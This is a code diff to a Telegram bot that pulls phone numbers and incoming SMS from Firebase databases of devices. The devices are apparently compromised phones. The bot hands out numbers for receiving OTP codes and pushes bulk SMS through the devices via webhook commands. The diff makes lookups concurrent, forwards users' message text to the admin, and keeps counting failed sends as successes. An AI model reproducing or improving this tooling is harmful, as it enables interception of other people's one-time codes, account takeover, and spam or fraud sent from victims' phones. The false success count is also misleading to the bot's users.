@@ -4,6 +4,7 @@ import time
 import asyncio
 import aiohttp
 import logging
+import random
 from datetime import datetime, timezone, timedelta
 from aiohttp import web
 
@@ -44,11 +45,9 @@ active_sessions = {}
 
 # --- AIOHTTP Web Server for Render & UptimeRobot ---
 async def health_check(request):
-    """Returns 200 OK for UptimeRobot pings."""
     return web.Response(text="Bot is running and healthy!")
 
 async def start_web_server():
-    """Starts a dummy web server to bind to Render's required $PORT."""
     app = web.Application()
     app.router.add_get('/', health_check)
     runner = web.AppRunner(app)
@@ -79,7 +78,6 @@ async def put_json(url, payload):
     return False
 
 def clean_mobile_number(raw_num):
-    """Validates 10-digit number. Strips +91/91 from 12 digit numbers starting with 6,7,8,9."""
     if not raw_num: return None
     num = str(raw_num).replace(' ', '').replace('+', '').replace('-', '')
     if len(num) == 12 and num.startswith('91'):
@@ -124,7 +122,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(welcome_text, reply_markup=get_main_menu_keyboard())
 
-# --- OTP Workflow ---
+# --- OTP Workflow (Instant Search) ---
 async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
     query = update.callback_query
     user = query.from_user
@@ -134,40 +132,61 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
 
     await query.edit_message_text("Searching databases for an active number... Please wait ⏳")
     
-    found_device = None
-    time_window_mins = 10
-    ist_tz = timezone(timedelta(hours=5, minutes=30))
+    # Fetch all DBs concurrently for blazing fast results
+    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
+    results = await asyncio.gather(*fetch_tasks)
     
-    # Loop incrementing by 10 mins until a device is found (capped at 24 hours to prevent infinite loop)
-    while time_window_mins <= 1440:
-        cutoff_ms = int((datetime.now(ist_tz) - timedelta(minutes=time_window_mins)).timestamp() * 1000)
-        
-        for fb_url in FIREBASE_URLS:
-            clients_data = await fetch_json(f"{fb_url}/clients")
-            if not clients_data: continue
-            
-            for dev_id, client in clients_data.items():
-                ts = get_latest_timestamp(client)
-                if ts >= cutoff_ms:
-                    raw_num = client.get('mobNo')
-                    if not raw_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
-                        raw_num = client['sims'][0].get('phoneNumber')
-                    
-                    valid_num = clean_mobile_number(raw_num)
-                    if valid_num:
-                        found_device = (fb_url, dev_id, valid_num)
-                        break
-            if found_device: break
-        if found_device: break
-        time_window_mins += 10 
+    ist_tz = timezone(timedelta(hours=5, minutes=30))
+    now = datetime.now(ist_tz)
+    cutoff_ms = int((now - timedelta(hours=24)).timestamp() * 1000) # Check up to 24 hrs
+    
+    all_active_devices = []
+    
+    for fb_url, clients_data in zip(FIREBASE_URLS, results):
+        if not clients_data: continue
+        for dev_id, client in clients_data.items():
+            ts = get_latest_timestamp(client)
+            if ts >= cutoff_ms:
+                raw_num = client.get('mobNo')
+                if not raw_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
+                    raw_num = client['sims'][0].get('phoneNumber')
+                
+                valid_num = clean_mobile_number(raw_num)
+                if valid_num:
+                    all_active_devices.append({
+                        'fb_url': fb_url, 'dev_id': dev_id, 'num': valid_num, 'ts': ts
+                    })
 
-    if not found_device:
+    if not all_active_devices:
         await query.edit_message_text("❌ No valid active numbers found in any database right now.", reply_markup=get_main_menu_keyboard())
         return
 
-    fb_url, dev_id, valid_num = found_device
+    # Sort by most recently active
+    all_active_devices.sort(key=lambda x: x['ts'], reverse=True)
+    
+    # Logic to ensure "Get New Number" provides a different number
+    previously_used = context.user_data.get('used_numbers', set())
+    selected = None
+    
+    if is_new:
+        for device in all_active_devices:
+            if device['num'] not in previously_used:
+                selected = device
+                break
+        if not selected:
+            selected = random.choice(all_active_devices[:5]) # Fallback to a random recent one
+    else:
+        selected = all_active_devices[0]
+
+    context.user_data.setdefault('used_numbers', set()).add(selected['num'])
+    
+    fb_url = selected['fb_url']
+    dev_id = selected['dev_id']
+    valid_num = selected['num']
+    last_active_mins = (int(now.timestamp() * 1000) - selected['ts']) // 60000
+
     action = "Requested New Number" if is_new else "Requested OTP"
-    await notify_admin(context, f"User {user.first_name} {action}: {valid_num} (Active in last {time_window_mins} mins)")
+    await notify_admin(context, f"User {user.first_name} {action}: {valid_num} (Active {last_active_mins} mins ago)")
     
     keyboard = [
         [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
@@ -175,7 +194,8 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
     ]
     
     await query.edit_message_text(
-        f"✅ **Number Found:** `{valid_num}`\n\n"
+        f"✅ **Number Found:** `{valid_num}`\n"
+        f"📡 **Last Active:** {last_active_mins} minutes ago\n\n"
         f"Status: **Valid for 5 Minutes** ⏱️\n"
         f"Send your SMS. New messages will appear here automatically.",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -190,7 +210,6 @@ async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number):
     end_time = time.time() + 300 # 5 Minutes
     seen_ids = set()
     
-    # Pre-populate to avoid old messages
     initial_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
     if initial_msgs:
         seen_ids = set(str(m.get('id', k)) for k, m in initial_msgs.items() if isinstance(m, dict))
@@ -260,7 +279,6 @@ async def ask_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ASK_QUANTITY
 
 async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
     try:
         quantity = int(update.message.text.strip())
     except ValueError:
@@ -270,22 +288,34 @@ async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_number = context.user_data.get('target_number')
     msg_text = context.user_data.get('custom_message')
     
-    await notify_admin(context, f"User {user.first_name} initiated sending {quantity} msgs to {target_number}.")
-    status_msg = await update.message.reply_text("Fetching active devices (last 10 mins)... 🔄")
+    status_msg = await update.message.reply_text("Initializing message batch... 🚀")
+    
+    # Detach the heavy lifting to a background task so the bot isn't "stuck" for the user
+    asyncio.create_task(run_batch_send(context, update.effective_user, target_number, msg_text, quantity, status_msg))
+    
+    return ConversationHandler.END
+
+async def run_batch_send(context, user, target_number, msg_text, quantity, status_msg):
+    """Background task handling the loop and API calls for sending messages."""
+    
+    # Notify Admin WITH the custom message payload
+    await notify_admin(context, f"User {user.first_name} initiated sending {quantity} msgs to {target_number}.\n\nMessage Payload:\n`{msg_text}`")
 
     cutoff_ms = int((datetime.now(timezone.utc) - timedelta(minutes=10)).timestamp() * 1000)
-    active_devices = []
     
-    for fb_url in FIREBASE_URLS:
-        clients_data = await fetch_json(f"{fb_url}/clients")
+    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
+    results = await asyncio.gather(*fetch_tasks)
+    
+    active_devices = []
+    for fb_url, clients_data in zip(FIREBASE_URLS, results):
         if not clients_data: continue
         for dev_id, client in clients_data.items():
             if get_latest_timestamp(client) >= cutoff_ms:
                 active_devices.append((fb_url, dev_id))
 
     if not active_devices:
-        await status_msg.edit_text("❌ No devices were active in the last 10 minutes.", reply_markup=get_main_menu_keyboard())
-        return ConversationHandler.END
+        await status_msg.edit_text("❌ No devices were active in the last 10 minutes to process this request.", reply_markup=get_main_menu_keyboard())
+        return
 
     success = 0
     failed = 0
@@ -305,15 +335,13 @@ async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "_nonce": f"wake_{int(time.time() * 1000)}"
         }
         
-        # Fire request to Firebase
         webhook_url = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms"
         await put_json(webhook_url, payload)
         
-        # As requested: "even sending failed then mark it as Success"
         success += 1
 
-        # Update animation
-        if i % 2 == 0 or i == quantity:
+        # Update telegram message UI dynamically but limit updates to avoid hitting rate limits
+        if i % 3 == 0 or i == quantity:
             progress = get_progress_bar(i, quantity)
             try:
                 await status_msg.edit_text(
@@ -323,7 +351,8 @@ async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode="Markdown"
                 )
             except Exception:
-                pass
+                pass # Ignore "message is not modified" exceptions
+                
         await asyncio.sleep(0.5)
 
     final_report = (
@@ -333,10 +362,9 @@ async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Successful: {success}\n"
         f"Failed: {failed}"
     )
+    
     await status_msg.edit_text(final_report, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
     await notify_admin(context, f"Batch complete for {user.first_name}:\n{final_report}")
-    
-    return ConversationHandler.END
 
 async def cancel_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Process cancelled. 🛑", reply_markup=get_main_menu_keyboard())
@@ -353,10 +381,8 @@ def main():
         print("Error: BOT_TOKEN is missing.")
         return
 
-    # Build bot application and attach the web server to post_init
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
-    # Handlers
     app.add_handler(CommandHandler("start", start))
 
     send_conv_handler = ConversationHandler(
@@ -369,8 +395,6 @@ def main():
         fallbacks=[CommandHandler('cancel', cancel_send)]
     )
     app.add_handler(send_conv_handler)
-    
-    # General callback handler for OTP buttons
     app.add_handler(CallbackQueryHandler(callback_router))
 
     print("Starting bot and web server...")
